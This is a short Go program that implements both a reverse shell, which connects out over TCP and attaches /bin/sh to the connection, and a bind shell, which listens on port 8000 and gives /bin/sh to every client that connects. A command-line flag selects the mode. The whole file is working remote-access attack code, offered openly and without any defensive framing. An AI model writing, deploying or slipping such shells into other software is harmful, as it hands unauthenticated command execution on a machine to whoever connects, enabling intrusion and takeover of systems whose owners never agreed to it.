package main

import (
	"flag"
	"log"
	"net"
	"os/exec"
)

func reverseShell(network, address, shell string) {
	c, err := net.Dial(network, address)
	if err != nil {
		log.Println(err)
		return
	}

	cmd := exec.Command(shell)

	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c

	err = cmd.Run()
	if err != nil {
		log.Println(err)
		return
	}
}

func bindShell(network, address, shell string) {
	l, err := net.Listen(network, address)
	if err != nil {
		log.Println(err)
		return
	}
	defer l.Close()

	for {
		// Wait for a connection.
		conn, err := l.Accept()
		if err != nil {
			log.Println(err)
			return
		}

		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		go func(c net.Conn) {
			cmd := exec.Command(shell)
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c

			err := cmd.Run()
			if err != nil {
				log.Println(err)
				return
			}
			defer c.Close()
		}(conn)
	}
}

var (
	r bool
)

func init() {
	flag.BoolVar(&r, "flag", false, "Reverse or bind shell?")
}

func main() {
	// разбор флагов
	flag.Parse()

	if r {
		reverseShell("tcp", ":8000", "/bin/sh")
	}

	bindShell("tcp", ":8000", "/bin/sh")
}
